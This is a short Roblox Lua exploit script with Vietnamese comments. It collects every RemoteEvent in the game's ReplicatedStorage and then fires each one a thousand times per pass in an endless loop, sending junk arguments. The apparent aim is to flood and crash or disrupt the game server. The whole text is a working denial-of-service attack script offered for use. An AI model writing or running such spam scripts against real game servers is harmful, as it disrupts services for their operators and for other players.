-- 📌 Script này tự tìm toàn bộ RemoteEvent trong ReplicatedStorage và spam chúng
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Tìm toàn bộ RemoteEvent trong ReplicatedStorage
local remoteList = {}
for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
    if remote:IsA("RemoteEvent") then
        table.insert(remoteList, remote)
        print("🧠 Tìm thấy Remote:", remote:GetFullName())
    end
end

-- Bắt đầu spam liên tục
while true do
    for _, remote in pairs(remoteList) do
        for i = 1, 1000 do
            pcall(function()
                remote:FireServer("🧨", math.random(), {}, true, nil)
            end)
        end
    end
end
